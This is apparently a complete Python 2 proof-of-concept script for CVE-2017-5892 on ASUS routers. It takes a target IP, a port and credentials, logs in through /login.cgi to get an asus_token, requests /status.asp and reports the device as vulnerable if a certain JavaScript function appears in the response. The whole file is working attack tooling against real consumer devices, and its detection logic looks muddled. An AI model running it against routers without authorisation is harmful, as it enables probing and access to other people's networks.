import sys
import re
import base64
import requests
from colorama import Fore

description= r"""
 -----------------------------------------------------------------------------
|                                                                            |
|                                                                            |
|                                                                            |
|                                 Hyo-In                                     |
|                                                                            |
|                                                                            |
|                                                                            |
 -----------------------------------------------------------------------------
"""
def packet(target, port, cookie):
	try:
		URL = 'http://'+target+':'+port+'/login.cgi'
		data = {'group_id': '', 'action_mode': '', 'action_script': '', 'action_wait': '5', 'current_page': 'Main_Login.asp', 'next_page': 'index.asp', 'login_authorization': cookie}
		s = requests.Session()
		req = s.post(URL, data=data)

		token = s.cookies.get_dict()['asus_token']

		URL = 'http://'+target+':'+port+'/status.asp'
		headers = {'Cookie' : 'asus_token=' + token}
		req = s.get(URL, headers=headers)
	
		if req.status_code == 200 and re.search('function wanlink_ipaddr()', req.text):
			print (Fore.GREEN+" [+] Vulnarable to CVE-2017-5892"+Fore.RESET)
		else:
			print (Fore.YELLOW+" [-] Not Vulnarable to CVE-2017-5892"+Fore.RESET)

	except:
		print(Fore.YELLOW+" [-] Not Vulnarable to CVE-2017-5892"+Fore.RESET)
		pass




# MAIN
if __name__ == "__main__":
	print description
	if len(sys.argv) is not 5:
		print(Fore.YELLOW+" [-] Example: python CVE-2017-5892.py <Target IP> <port> <ID> <Password>"+Fore.RESET)
		sys.exit(1)
	else:
		cookie = base64.encodestring(sys.argv[3]+':'+sys.argv[4]).rstrip('\n')
		packet(sys.argv[1], sys.argv[2], cookie)
